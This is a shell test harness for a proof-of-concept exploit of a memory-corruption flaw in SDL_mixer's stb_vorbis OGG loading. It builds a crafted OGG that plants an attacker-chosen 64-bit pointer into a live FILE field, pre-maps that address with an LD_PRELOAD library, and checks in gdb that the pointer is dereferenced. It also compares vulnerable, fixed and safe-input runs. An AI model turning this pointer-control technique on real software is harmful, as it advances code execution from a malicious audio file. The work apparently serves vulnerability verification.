#!/bin/sh
# W209: the crafted file can spell a CANONICAL 64-bit pointer (0x00007f41
# repeated) into a live SDL_mixer FILE field. This harness pre-reserves that
# deterministic address and a benign marker; that mapping is harness-only and
# is NOT attacker input. Fixed/safe controls and the unmapped control stay.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p evidence build/canon consumer/evidence
printf 'not an ogg file\n' > evidence/safe-input.bin
python3 gen_poc.py evidence/chosen-canonical.ogg 16519105 65 0x00007f41 >/dev/null || exit 2
gcc -fPIC -shared -o build/canon/canon-map.so consumer/canon-map.c || exit 2

sh run-consumer-preload.sh > consumer/evidence/canon-controls.out 2>&1
CTL_RC=$?
SDM=../sdlmixer2shell/deps
SDL3DIR=$(CDPATH= cd -- "$SDM/SDL3-3.4.0-build" && pwd)
export LD_LIBRARY_PATH="$SDL3DIR"
export SDL_AUDIO_DRIVER=dummy
MAP="$HERE/build/canon/canon-map.so"

LD_PRELOAD="$MAP" /bin/true > consumer/evidence/canon-map-check.out 2>&1
MAP_RC=$?
LD_PRELOAD="$MAP" ./consumer/mix-stb-vuln-plain \
    evidence/chosen-canonical.ogg evidence/preload-safe.ogg \
    > consumer/evidence/canon-plain-mapped.out 2>&1
MAPPED_RC=$?
./consumer/mix-stb-vuln-plain \
    evidence/chosen-canonical.ogg evidence/preload-safe.ogg \
    > consumer/evidence/canon-plain-unmapped.out 2>&1
UNMAPPED_RC=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    ./consumer/mix-stb-fixed evidence/chosen-canonical.ogg evidence/preload-safe.ogg \
    > consumer/evidence/canon-fixed.out 2>&1
FIXED_RC=$?
LD_PRELOAD="$MAP" ./consumer/mix-stb-vuln-plain \
    evidence/safe-input.bin evidence/preload-safe.ogg \
    > consumer/evidence/canon-safe.out 2>&1
SAFE_RC=$?
LD_PRELOAD="$MAP" gdb -batch -ex 'unset env LINES' -ex 'unset env COLUMNS' \
    -ex 'set args evidence/chosen-canonical.ogg evidence/preload-safe.ogg' \
    -x consumer/canon-break.gdb ./consumer/mix-stb-vuln-plain \
    > consumer/evidence/canon-gdb.out 2>&1
GDB_RC=$?

printf 'ctl=%s map=%s mapped=%s unmapped=%s fixed=%s safe=%s gdb=%s\n' \
    "$CTL_RC" "$MAP_RC" "$MAPPED_RC" "$UNMAPPED_RC" "$FIXED_RC" "$SAFE_RC" "$GDB_RC"
PASS=0; FAIL=0
check() {
  if grep -qF "$2" "$3"; then
    PASS=$((PASS+1)); echo "PASS $1 $2"
  else
    FAIL=$((FAIL+1)); echo "FAIL $1 expected $2"
  fi
}
HASH=$(sha256sum evidence/chosen-canonical.ogg | cut -d' ' -f1)
[ "$HASH" = 6d14dc9491706f86389534600e76d84fa1b33d48888b10784f8d5eb9f7cb71f2 ] \
  && { PASS=$((PASS+1)); echo 'PASS poc_sha256'; } \
  || { FAIL=$((FAIL+1)); echo "FAIL poc_sha256 got=$HASH"; }
[ "$CTL_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS w208_controls rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL w208_controls rc=$CTL_RC"; }
check w208_controls_17 'TOTAL PASS=17 FAIL=0' consumer/evidence/canon-controls.out
[ "$MAP_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS map_rc rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL map_rc rc=$MAP_RC"; }
check map_marker 'CANON_MAP_OK page=0x7f4100007000 marker=CANON_OK' consumer/evidence/canon-map-check.out
[ "$MAPPED_RC" -eq 134 ] && { PASS=$((PASS+1)); echo 'PASS mapped_free rc=134'; } || { FAIL=$((FAIL+1)); echo "FAIL mapped_free rc=$MAPPED_RC"; }
check mapped_invalid_ptr 'free(): invalid pointer' consumer/evidence/canon-plain-mapped.out
[ "$UNMAPPED_RC" -eq 139 ] && { PASS=$((PASS+1)); echo 'PASS unmapped_segv rc=139'; } || { FAIL=$((FAIL+1)); echo "FAIL unmapped_segv rc=$UNMAPPED_RC"; }
[ "$FIXED_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS fixed rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL fixed rc=$FIXED_RC"; }
check fixed_rejects 'MIX_LoadAudio_IO=(nil)' consumer/evidence/canon-fixed.out
[ "$SAFE_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS safe rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL safe rc=$SAFE_RC"; }
[ "$GDB_RC" -eq 0 ] && { PASS=$((PASS+1)); echo 'PASS gdb_rc rc=0'; } || { FAIL=$((FAIL+1)); echo "FAIL gdb_rc rc=$GDB_RC"; }
check canonical_field 'save_base=0x7f4100007f41 backup_base=0x7f4100007f41 save_end=0x7f4100007f41' consumer/evidence/canon-gdb.out
check deref_marker 'CANON_OK' consumer/evidence/canon-gdb.out
echo "TOTAL PASS=$PASS FAIL=$FAIL"
grep -E 'CANON_POST|CANON_OK' consumer/evidence/canon-gdb.out
[ "$FAIL" -eq 0 ]
